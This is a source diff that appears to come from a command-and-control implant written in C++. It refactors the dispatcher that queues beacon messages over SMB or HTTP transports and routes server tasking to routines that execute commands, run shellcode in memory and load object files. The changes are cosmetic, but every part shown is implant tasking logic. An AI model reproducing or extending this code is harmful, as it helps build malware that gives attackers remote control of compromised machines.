@@ -63,9 +63,9 @@ namespace Dispatcher {
             Parser::CreateParser(&parser, B_PTR(msg->buffer), msg->length);
 
             queue            = Stream::CreateStream();
-            queue->peer_id   = __builtin_bswap32((ULONG) Parser::UnpackDword(&parser));
-            queue->task_id   = __builtin_bswap32((ULONG) Parser::UnpackDword(&parser));
-            queue->msg_type  = __builtin_bswap32((ULONG) Parser::UnpackDword(&parser));
+            queue->peer_id   = __builtin_bswap32(Parser::UnpackDword(&parser));
+            queue->task_id   = __builtin_bswap32(Parser::UnpackDword(&parser));
+            queue->msg_type  = __builtin_bswap32(Parser::UnpackDword(&parser));
 
             queue->length   = parser.Length;
             queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));
@@ -106,9 +106,9 @@ namespace Dispatcher {
             Stream::PackDword(queue, cb_seg);
             Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);
 
-            index++;
             length -= cb_seg;
             offset += cb_seg;
+            index++;
 
             AddMessage(queue);
         }
@@ -130,7 +130,6 @@ namespace Dispatcher {
                 Stream::PackDword(out, head->task_id);
                 Stream::PackDword(out, head->msg_type);
 
-                // egress to server should prepend msg_buffer with length
                 if (Ctx->root) {
                     Stream::PackBytes(out, B_PTR(head->buffer), head->length);
                 }
@@ -165,24 +164,22 @@ namespace Dispatcher {
     }
 
     VOID DispatchRoutine() {
-
-        _stream *out    = { };
-        _stream *in     = { };
-
         retry:
-        if (!Ctx->transport.outbound_queue) {
 
+        if (!Ctx->transport.outbound_queue) {
 #ifdef TRANSPORT_SMB
+
             nstatus = ERROR_SUCCESS;
             return;
 #else
-            const auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
-            Dispatcher::MessageQueue(entry);
+            Dispatcher::MessageQueue(Stream::CreateStreamWithHeaders(TypeTasking));
             goto retry;
 #endif
         }
 
-        out = Stream::CreateStream();
+        _stream *out    = Stream::CreateStream();
+        _stream *in     = { };
+
         Dispatcher::PrepareEgress(out);
 
 #ifdef TRANSPORT_HTTP
@@ -210,15 +207,22 @@ namespace Dispatcher {
 
         switch (Parser::UnpackDword(&parser)) {
             case TypeCheckin:
+
                 x_memset(&Ctx->session.checkin, true, sizeof(bool));
                 break;
+
             case TypeTasking:
+
                 Memory::Execute::ExecuteCommand(parser);
                 break;
+
             case TypeExecute:
+
                 Memory::Execute::ExecuteShellcode(parser);
                 break;
+
             case TypeObject:
+
                 Objects::LoadObject(parser);
                 break;
 
